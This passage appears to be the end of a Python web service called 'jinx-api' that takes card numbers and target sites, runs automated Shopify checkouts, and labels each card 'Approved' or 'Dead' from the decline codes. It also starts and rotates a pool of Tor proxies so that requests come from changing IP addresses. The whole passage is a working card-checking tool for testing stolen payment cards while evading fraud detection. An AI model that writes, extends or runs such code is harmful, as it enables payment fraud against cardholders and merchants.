                return out

            if rtn == "ActionRequiredReceipt":
                out["Response"] = "3DS_REQUIRED"
                out["Status"] = "Approved"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "FailedReceipt":
                pe = receipt.get("processingError", {}) or {}
                code = pe.get("code", "CARD_DECLINED")
                msg = pe.get("messageUntranslated", "")
                out["Response"] = map_code(code) if code else "CARD_DECLINED"
                if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                    out["Status"] = "Approved"
                    out["Gateway"] = "Shopify Payments"
                else:
                    out["Status"] = "Dead"
                return out

        out["Response"] = "POLL_TIMEOUT"
        return out

    except Exception as e:
        dbg(f"TOP EXC: {type(e).__name__}: {str(e)[:60]}")
        out["Response"] = f"EXCEPTION_{type(e).__name__}"
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            no_proxy_sess.close()
        except Exception:
            pass


# ═══ HTTP HANDLERS ═══
async def handle_check(request):
    cc = request.query.get("cc", "").strip()
    site = request.query.get("site", "").strip()
    proxy = request.query.get("proxy", "").strip() or None
    debug = request.query.get("debug", "0") == "1"
    use_tor = request.query.get("tor", "0") == "1"

    if not cc or not site:
        return web.json_response({
            "Response": "MISSING_PARAMS",
            "Price": "-",
            "Gateway": "UNKNOWN",
            "Status": "Site Error",
        })

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        executor, checkout_sync, cc, site, proxy, debug, use_tor
    )

    resp = {
        "Response": result.get("Response", "CARD_DECLINED"),
        "Price": result.get("Price", "-"),
        "Gateway": result.get("Gateway", "Shopify"),
        "Status": result.get("Status", "Dead"),
    }
    if debug:
        resp["Debug"] = result.get("Debug", "")
    return web.json_response(resp)


async def handle_tor_start(request):
    try:
        count = int(request.query.get("count", TOR_POOL_SIZE))
    except ValueError:
        count = TOR_POOL_SIZE
    count = max(1, min(count, 10))

    ok = await start_tor_pool(count)
    if not ok:
        return web.json_response({
            "status": "error",
            "message": "Tor pool failed to start. Is Tor installed?",
        }, status=500)

    start_auto_rotate()
    ip_pairs = await get_all_proxy_ips()
    return web.json_response({
        "status": "ok",
        "count": len(_tor_processes),
        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
        "auto_rotate_sec": AUTO_ROTATE_INTERVAL,
    })


async def handle_tor_stop(request):
    global _tor_enabled
    stop_auto_rotate()
    _tor_enabled = False
    await _kill_all_tor()
    return web.json_response({"status": "ok", "message": "Tor pool stopped"})


async def handle_tor_rotate(request):
    if not _tor_processes:
        return web.json_response({"status": "error", "message": "Tor not running"}, status=400)
    ok = await rotate_tor()
    if not ok:
        return web.json_response({"status": "error", "message": "Rotate failed"}, status=500)
    await asyncio.sleep(2)
    ip_pairs = await get_all_proxy_ips()
    return web.json_response({
        "status": "ok",
        "rotated": len(_tor_processes),
        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
    })


async def handle_tor_ips(request):
    if not _tor_processes:
        return web.json_response({"status": "error", "message": "Tor not running"}, status=400)
    ip_pairs = await get_all_proxy_ips()
    return web.json_response({
        "status": "ok",
        "count": len(_tor_processes),
        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
    })


async def handle_health(request):
    return web.json_response({
        "status": "ok",
        "service": "jinx-api",
        "version": "6.0.0",
        "tor_enabled": _tor_enabled,
        "tor_instances": len(_tor_processes),
    })


async def handle_root(request):
    return web.json_response({
        "service": "jinx-api",
        "version": "6.0.0",
        "endpoints": [
            "/Shopify?cc=<card>&site=<site>&proxy=<optional>&tor=0|1&debug=0|1",
            "/tor/start?count=5",
            "/tor/stop",
            "/tor/rotate",
            "/tor/ips",
            "/health",
        ],
    })


def make_app():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_get("/Shopify", handle_check)
    app.router.add_get("/shopify", handle_check)
    app.router.add_get("/tor/start", handle_tor_start)
    app.router.add_get("/tor/stop", handle_tor_stop)
    app.router.add_get("/tor/rotate", handle_tor_rotate)
    app.router.add_get("/tor/ips", handle_tor_ips)
    return app


executor = ThreadPoolExecutor(max_workers=WORKERS)


if __name__ == "__main__":
    print(f"Jinx-api v6.0 (5-in-1) starting on http://{HOST}:{PORT}")
    print(f"Workers: {WORKERS}")
    print()
    print("Endpoints:")
    print(f"  GET /Shopify?cc=<card>&site=<site>&proxy=<optional>&tor=0|1&debug=0|1")
    print(f"  GET /tor/start?count=5    → Start Tor proxy pool")
    print(f"  GET /tor/stop             → Stop Tor pool")
    print(f"  GET /tor/rotate           → Rotate all circuits")
    print(f"  GET /tor/ips              → Get all exit IPs")
    print(f"  GET /health               → Health check")
    print()
    app = make_app()
    web.run_app(app, host=HOST, port=PORT, access_log=None, print=None)
